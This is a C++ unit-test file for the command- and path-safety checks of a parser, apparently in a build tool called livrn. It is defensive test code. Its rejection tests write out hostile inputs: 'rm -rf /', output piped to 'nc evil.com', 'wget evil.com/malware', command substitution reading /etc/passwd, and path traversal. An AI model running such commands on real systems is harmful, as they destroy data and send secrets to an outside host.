#include "../src/util/parser.h"
#include "test_helpers.h"
#include <gtest/gtest.h>

class ParserTest : public ::testing::Test {
protected:
  void SetUp() override { TestEnvironment::SetUpTestDirectory(); }

  void TearDown() override { TestEnvironment::TearDownTestDirectory(); }
};

// FIXME
// TEST_F(ParserTest, PathSafety_ValidPath) {
//   TestEnvironment::createTestFile("test.cpp", "int main() { return 0; }");
//   EXPECT_TRUE(livrn::Parser::isPathSafe("test.cpp"));
//   EXPECT_TRUE(livrn::Parser::isPathSafe("./test.cpp"));
// }

TEST_F(ParserTest, PathSafety_InvalidPath) {
  EXPECT_FALSE(livrn::Parser::isPathSafe("../../../etc/passwd"));
  EXPECT_FALSE(livrn::Parser::isPathSafe("../unsafe.cpp"));
}

TEST_F(ParserTest, PathSafety_TooLongPath) {
  std::string longPath(livrn::Config::MAX_PATH_LENGTH + 1, 'a');
  longPath += ".cpp";
  EXPECT_FALSE(livrn::Parser::isPathSafe(longPath));
}

TEST_F(ParserTest, CommandSafety_ValidCommands) {
  EXPECT_TRUE(livrn::Parser::isCommandSafe("gcc main.cpp -o main"));
  EXPECT_TRUE(livrn::Parser::isCommandSafe("make clean"));
  EXPECT_TRUE(livrn::Parser::isCommandSafe("go build"));
  EXPECT_TRUE(livrn::Parser::isCommandSafe("cargo build"));
}

TEST_F(ParserTest, CommandSafety_InvalidCommands) {
  EXPECT_FALSE(livrn::Parser::isCommandSafe("rm -rf /"));
  EXPECT_FALSE(livrn::Parser::isCommandSafe("gcc main.cpp; rm -rf /"));
  EXPECT_FALSE(livrn::Parser::isCommandSafe("gcc main.cpp | nc evil.com 1234"));
  EXPECT_FALSE(
      livrn::Parser::isCommandSafe("gcc main.cpp && wget evil.com/malware"));
  EXPECT_FALSE(livrn::Parser::isCommandSafe("gcc `whoami` main.cpp"));
  EXPECT_FALSE(livrn::Parser::isCommandSafe("gcc $(cat /etc/passwd) main.cpp"));
}

TEST_F(ParserTest, CommandSafety_EmptyOrTooLong) {
  EXPECT_FALSE(livrn::Parser::isCommandSafe(""));

  std::string longCommand(livrn::Config::MAX_COMMAND_LENGTH + 1, 'a');
  EXPECT_FALSE(livrn::Parser::isCommandSafe(longCommand));
}

TEST_F(ParserTest, CommandSafety_UnallowedCommands) {
  EXPECT_FALSE(livrn::Parser::isCommandSafe("rm file.txt"));
  EXPECT_FALSE(livrn::Parser::isCommandSafe("wget http://example.com"));
  EXPECT_FALSE(livrn::Parser::isCommandSafe("curl http://example.com"));
}

TEST_F(ParserTest, BinaryFileDetection) {
  // Create a text file
  TestEnvironment::createTestFile(
      "text.cpp", "#include <iostream>\nint main() { return 0; }");
  EXPECT_FALSE(livrn::Parser::isBinaryFile("text.cpp"));

  // Create a binary file (simulate with null bytes)
  std::ofstream binFile("binary.exe", std::ios::binary);
  binFile.write("\x00\x01\x02\x03\x7F\xFF", 6);
  binFile.close();
  EXPECT_TRUE(livrn::Parser::isBinaryFile("binary.exe"));
}
